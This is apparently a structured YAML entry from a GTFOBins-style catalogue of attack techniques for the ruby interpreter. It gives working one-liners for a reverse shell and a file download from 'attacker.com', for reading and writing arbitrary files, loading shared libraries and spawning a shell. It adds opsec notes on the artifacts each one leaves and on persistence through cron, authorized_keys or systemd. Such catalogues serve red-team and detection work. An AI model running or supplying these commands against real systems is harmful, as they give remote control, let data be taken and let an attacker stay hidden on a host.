---
name: ruby
capabilities:
- exec
- spawn
- read
- write
- upload
- download
- reverse-shell
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download, "/path/to/output-file")'
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: ruby -e 'puts File.read("/path/to/input-file")'
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: ruby -e 'File.open("/path/to/output-file", "w+") { |f| f.write("DATA") }'
- id: library-load
  description: Load an arbitrary shared library.
  capabilities:
  - exec
  command: ruby -e 'require "fiddle"; Fiddle.dlopen("/path/to/lib.so")'
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: ruby -e 'exec "/bin/sh"'
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: ruby -run -e httpd . -p 80
references:
- https://gtfobins.github.io/gtfobins/ruby/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
